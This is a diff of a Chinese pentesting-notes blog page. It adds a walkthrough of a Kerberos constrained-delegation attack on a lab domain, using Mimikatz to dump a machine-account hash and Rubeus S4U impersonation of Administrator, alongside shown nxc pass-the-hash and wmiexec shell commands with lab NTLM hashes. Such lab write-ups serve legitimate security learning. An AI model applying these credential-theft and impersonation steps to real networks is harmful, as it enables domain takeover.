@@ -27,7 +27,7 @@
 <meta property="og:description" content="比较乱，梦到哪句写哪句 不管干什么事，同步域控时间准没错。 AS-REP Roasting攻击1234567891011121314┌──(root㉿kaada)-[&#x2F;home&#x2F;kali&#x2F;Desktop]└─# impacket-GetNPUsers -usersfile users.txt -no-pass -dc-ip 10.129.231.186 certified.htb&#x2F;    Impa">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-02-18T12:27:30.000Z">
-<meta property="article:modified_time" content="2026-02-20T03:04:27.566Z">
+<meta property="article:modified_time" content="2026-02-20T11:33:26.837Z">
 <meta property="article:author" content="Skyarrow">
 <meta property="article:tag" content="杂记">
 <meta name="twitter:card" content="summary_large_image">
@@ -237,7 +237,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k words
+          3.2k words
         
       </span>
     
@@ -248,7 +248,7 @@
         
         
         
-          22 mins
+          27 mins
         
       </span>
     
@@ -388,6 +388,32 @@
 
 <figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs smali">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># nxc smb 192.168.21.130 -u administrator -H bbabdc192282668fe5190ab0c5150b34</span><br>SMB         192.168.21.130  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:novice.com) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                <br>SMB         192.168.21.130  445    DC               [+] novice.com\administrator:bbabdc192282668fe5190ab0c5150b34 (Pwn3d!)<br><br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># impacket-wmiexec -k -no-pass DC.novice.com </span><br>Impacket v0.14.0.dev0 - Copyright Fortra, LLC<span class="hljs-built_in"> and </span>its affiliated companies <br><br>[*] SMBv3.0 dialect used<br>[!] Launching semi-interactive shell - Careful what you<span class="hljs-built_in"> execute</span><br><span class="hljs-built_in"></span>[!] Press help for extra shell commands<br>C:\&gt;whoami<br>novice\administrator<br></code></pre></td></tr></table></figure>
 
+<h2 id="针对-Domain-Controller-的约束委派攻击"><a href="#针对-Domain-Controller-的约束委派攻击" class="headerlink" title="针对 Domain Controller 的约束委派攻击"></a>针对 Domain Controller 的约束委派攻击</h2><p>为了伪造域管（Administrator）去访问 DC 的 C$ 共享 ，攻击需要利用 Kerberos 协议的两个关键扩展协议：<strong>S4U2Self</strong> (Service for User to Self) 和 <strong>S4U2Proxy</strong> (Service for User to Proxy)。</p>
+<ul>
+<li><p><strong>前置条件：获取机器账户凭证</strong></p>
+<p><strong>操作</strong>:使用 Mimikatz 从 172.22.2.16 的内存中导出了机器账户 <code>MSSQLSERVER$</code> 的 NTLM Hash (<code>f496fe749b403f432a5e2c0d49113a29</code>) 。</p>
+<ul>
+<li><strong>原理</strong>：只有拥有该服务（机器）账户的凭证，才能以该服务的身份向 KDC（密钥分发中心）发起委派请求。</li>
+</ul>
+</li>
+<li><p><strong>第一步：申请机器账户的 TGT</strong></p>
+<p><strong>操作</strong>：执行 <code>Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f496...</code> 。</p>
+<p><strong>原理</strong>：利用刚拿到的 NTLM Hash（RC4 加密），向域控伪造正常的 AS-REQ 请求，换取 <code>MSSQLSERVER$</code> 这个机器账户的 TGT（票据授权票据） 。</p>
+</li>
+<li><p><strong>第二步：S4U2Self (服务代表用户向自己申请票据)</strong></p>
+<p><strong>操作</strong>：包含在 <code>Rubeus.exe s4u /impersonateuser:Administrator ...</code> 命令的底层执行中 </p>
+<p><strong>原理</strong>：<code>MSSQLSERVER$</code> 拿着自己的 TGT 告诉 KDC：“域管 Administrator 正在访问我，请给我一张 Administrator 访问我自己的 TGS（服务票据）”。由于 S4U2Self 的特性，KDC <strong>不需要验证 Administrator 的密码</strong>，直接返回一张以 Administrator 身份访问 <code>MSSQLSERVER$</code> 的 TGS。且此票据带有 <code>forwardable</code>（可转发）属性 。</p>
+</li>
+<li><p><strong>第三步：S4U2Proxy (代表用户向其他服务申请票据)</strong></p>
+<p><strong>操作</strong>：请求指定服务 <code>/msdsspn:CIFS/DC.xiaorang.lab /ptt</code> 。</p>
+<p><strong>原理</strong>：<code>MSSQLSERVER$</code> 再次联系 KDC ：“我现在要代表 Administrator 去访问域控的 <code>CIFS</code> 服务（文件共享），这是刚刚你给我的、带有可转发属性的 Administrator 的 TGS”。KDC 检查 Active Directory 属性，发现 <code>MSSQLSERVER$</code> 确实被配置了到 <code>CIFS/DC.xiaorang.lab</code> 的约束委派权限 。验证通过，KDC 生成一张 Administrator 访问域控 CIFS 的最终 TGS，发给 <code>MSSQLSERVER$</code>。</p>
+</li>
+<li><p><strong>第四步：凭证注入与利用</strong></p>
+<p><strong>操作</strong>：Rubeus的 <code>/ptt</code> (Pass-The-Ticket) 参数直接将最后获取的高权限 TGS 注入到当前内存会话中 </p>
+<p><strong>原理</strong>：此时当前系统的上下文已经拥有了域管访问 DC 共享目录的合法票据，因此可以直接通过 <code>dir \\DC.xiaorang.lab\c$</code> 列出并读取 <code>flag04.txt</code> ，完成对整个域环境的最终攻陷。</p>
+<p>+2</p>
+</li>
+</ul>
 
                 
               </div>
@@ -456,6 +482,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2026/02/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Brute4Road/" title="春秋云境-Brute4Road">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">春秋云境-Brute4Road</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
